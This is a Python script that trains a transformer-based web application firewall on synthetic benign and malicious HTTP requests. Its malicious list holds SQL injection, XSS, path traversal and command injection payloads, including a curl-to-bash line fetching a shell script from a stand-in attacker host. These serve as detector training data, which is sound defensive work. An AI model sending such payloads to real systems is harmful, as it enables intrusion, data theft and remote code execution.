import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import Dataset, DataLoader
import random
import os
import sys

# Add parent dir
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))

from waf.model.transformer import WAFTransformer
from waf.model.tokenizer import HttpTokenizer

# --- Synthetic Data Generation with Adversarial Training ---
BENIGN_TEMPLATES = [
    "GET / HTTP/1.1",
    "GET /favicon.ico HTTP/1.1",
    "GET /api/Users HTTP/1.1",
    "GET /api/Products/{ID} HTTP/1.1",
    "POST /api/Login HTTP/1.1",
    "GET /assets/js/main.js HTTP/1.1",
    "GET /rest/products/search?q=apple HTTP/1.1",
    "GET /rest/products/search?q=banana HTTP/1.1",
    "GET /#/contact HTTP/1.1",
]

MALICIOUS_TEMPLATES = [
    # SQL Injection - Original
    "GET /rest/products/search?q=' OR 1=1 -- HTTP/1.1",
    # SQL Injection - Variations (Zero-day mimicking)
    "GET /rest/products/search?q=' or 1=1 -- HTTP/1.1",
    "GET /rest/products/search?q=' OR 1=1; -- HTTP/1.1",
    "GET /rest/products/search?q=1' AND '1'='1 HTTP/1.1",
    "GET /rest/products/search?q=' UNION SELECT NULL,USER(),VERSION()-- HTTP/1.1",
    "GET /rest/products/search?q=' UNION/**/SELECT 1,2,3-- HTTP/1.1",
    "GET /rest/products/search?q='; DROP TABLE users;-- HTTP/1.1",
    
    # XSS - Original
    "GET /rest/products/search?q=<script>alert(1)</script> HTTP/1.1",
    # XSS - Variations (Zero-day mimicking)
    "GET /rest/products/search?q=<script>eval(atob('YWxlcnQoMSk='))</script> HTTP/1.1",
    "GET /rest/products/search?q=<img src=x onerror=alert(1)> HTTP/1.1",
    "GET /rest/products/search?q=<svg onload=alert(1)> HTTP/1.1",
    "GET /rest/products/search?q=<iframe src='javascript:alert(1)'> HTTP/1.1",
    "GET /rest/products/search?q=<body onload=alert(1)> HTTP/1.1",
    
    # Path Traversal - Original
    "GET /etc/passwd HTTP/1.1",
    # Path Traversal - Variations
    "GET /etc/passwd%00.jpg HTTP/1.1",
    "GET /..%2f..%2fetc%2fpasswd HTTP/1.1",
    "GET /....//....//etc/passwd HTTP/1.1",
    "GET /var/www/html/config.php HTTP/1.1",
    "GET /opt/app/secret.key HTTP/1.1",
    
    "POST /api/Login ' OR '1'='1 HTTP/1.1",
    "GET /../../../etc/shadow HTTP/1.1",
    
    # Command Injection - Original
    "GET /?cmd=cat /etc/passwd HTTP/1.1",
    # Command Injection - Variations
    "GET /?cmd=whoami HTTP/1.1",
    "GET /?cmd=id HTTP/1.1",
    "GET /?cmd=ls -la HTTP/1.1",
    "GET /?cmd=find / -name '*.sql' HTTP/1.1",
    "GET /?cmd=curl http://attacker.com/shell.sh | bash HTTP/1.1",
    "GET /api/feedbacks?comment=;cat /etc/passwd HTTP/1.1",
    "GET /api/feedbacks?comment=| wget http://malware.com HTTP/1.1",
    
    "GET /dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1+--+&Submit=Submit HTTP/1.1",
]

def generate_synthetic_data(num_samples=5000):
    """Generate synthetic benign and malicious HTTP requests with adversarial variations"""
    data = []
    labels = []
    
    # Benign (Label 0) - Repeat templates for more data
    for _ in range(num_samples // 2):
        base = random.choice(BENIGN_TEMPLATES)
        if "{ID}" in base:
            base = base.replace("{ID}", str(random.randint(1, 1000)))
        data.append(base)
        labels.append(0)
        
    # Malicious (Label 1) - Now includes adversarial variations
    for _ in range(num_samples // 2):
        base = random.choice(MALICIOUS_TEMPLATES)
        data.append(base)
        labels.append(1)
        
    return data, labels

# --- Dataset ---
class WAFDataset(Dataset):
    def __init__(self, requests, labels, tokenizer):
        self.requests = requests
        self.labels = labels
        self.tokenizer = tokenizer

    def __len__(self):
        return len(self.requests)

    def __getitem__(self, idx):
        text = self.requests[idx]
        label = self.labels[idx]
        
        # Use tokenizer (returns dict of tensors)
        encoding = self.tokenizer.encode(text)
        
        # Squeeze to remove batch dimension added by tokenizer [1, seq_len] -> [seq_len]
        input_ids = encoding['input_ids'].squeeze(0)
        attention_mask = encoding['attention_mask'].squeeze(0)
            
        return input_ids, attention_mask, torch.tensor(label, dtype=torch.long)

# --- Training Loop ---
def train_pipeline():
    print("1. Generating Synthetic Data with Adversarial Variations...")
    texts, labels = generate_synthetic_data(5000)  # Increased from 1000 to 5000
    
    print(f"   Total samples: {len(texts)}")
    print(f"   Benign samples: {labels.count(0)}")
    print(f"   Malicious samples: {labels.count(1)}")
    print(f"   Adversarial variations included for zero-day detection")
    
    print("\n2. Initializing Tokenizer (SecureBERT)...")
    tokenizer = HttpTokenizer()
    # No training needed for pre-trained tokenizer
    
    # Save tokenizer config for deployment
    os.makedirs("waf/model/weights", exist_ok=True)
    tokenizer.save("waf/model/weights/tokenizer.json") 
    
    print("3. Fine-Tuning SecureBERT with Adversarial Training...")
    dataset = WAFDataset(texts, labels, tokenizer)
    dataloader = DataLoader(dataset, batch_size=16, shuffle=True)
    
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    print(f"Using device: {device}")
    
    model = WAFTransformer(num_classes=2)
    model.to(device)
    
    criterion = nn.CrossEntropyLoss()
    # Optimize entire model with lower learning rate for better generalization
    optimizer = optim.AdamW(model.parameters(), lr=1e-5) 
    
    num_epochs = 3  # Increased from 1 to 3 for better learning
    model.train()
    
    for epoch in range(num_epochs):
        total_loss = 0
        correct = 0
        total = 0
        
        for batch_idx, (input_ids, attention_mask, targets) in enumerate(dataloader):
            input_ids = input_ids.to(device)
            attention_mask = attention_mask.to(device)
            targets = targets.to(device)
            
            optimizer.zero_grad()
            outputs = model(input_ids, attention_mask=attention_mask)
            loss = criterion(outputs, targets)
            loss.backward()
            optimizer.step()
            
            total_loss += loss.item()
            _, predicted = outputs.max(1)
            total += targets.size(0)
            correct += predicted.eq(targets).sum().item()
            
            if batch_idx % 20 == 0:
                print(f"Batch {batch_idx} Loss: {loss.item():.4f}")
            
        epoch_accuracy = 100.*correct/total
        epoch_loss = total_loss/len(dataloader)
        print(f"\nEpoch {epoch+1}/{num_epochs} | Loss: {epoch_loss:.4f} | Accuracy: {epoch_accuracy:.2f}%")
        
    print("\n4. Saving Model...")
    torch.save(model.state_dict(), "waf/model/weights/waf_model.pth")
    print("Model saved to waf/model/weights/waf_model.pth")
    print("\n✅ Training complete! Model trained on:")
    print("   - 5000 synthetic samples")
    print("   - Adversarial variations for better zero-day detection")
    print("   - 3 epochs of training for improved generalization")

if __name__ == "__main__":
    train_pipeline()
